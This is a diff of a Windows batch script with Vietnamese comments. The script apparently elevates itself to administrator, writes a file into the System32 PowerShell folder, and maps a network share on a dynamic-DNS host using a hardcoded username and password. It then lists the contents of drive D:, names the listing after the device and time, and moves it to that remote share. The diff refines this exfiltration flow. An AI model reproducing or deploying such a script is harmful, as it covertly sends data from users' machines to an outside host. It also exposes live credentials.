@@ -3,7 +3,8 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
 echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
 rem del /f /q "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
-setlocal enabledelayedexpansion
+
+
 :: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
 net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
 
@@ -16,13 +17,26 @@ for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
 set DATE=%DATE:/=-%
 set TIME=%TIME::=-%
 
-:: Liệt kê nội dung ổ D: và lưu vào file
-dir D:\ > "%DeviceName%_%DATE%_%TIME%.txt"
+:: Tạo tên file dựa trên định dạng DeviceName_Date_Time
+set FileName=%DeviceName%_%DATE%_%TIME%.txt
 
+:: Liệt kê nội dung ổ D: và lưu vào file
+dir D:\ > "%FileName%"
+if errorlevel 1 (
+    echo Máy không có ổ D > "%FileName%"
+)
 
 :: Di chuyển file đến thư mục đích trên mạng
-move "%DeviceName%_%DATE%_%TIME%.txt" \\minhtuan283.ddns.net\hdd\serial\list\
+move "%FileName%" \\minhtuan283.ddns.net\hdd\serial\list\
 
 :: Ngắt kết nối chia sẻ mạng sau khi xong
 net use \\minhtuan283.ddns.net\hdd /delete
+
+:: Xóa các biến tạm
+set DeviceName=
+set DATE=
+set TIME=
+set FileName=
+
+echo Quá trình hoàn tất!
 exit
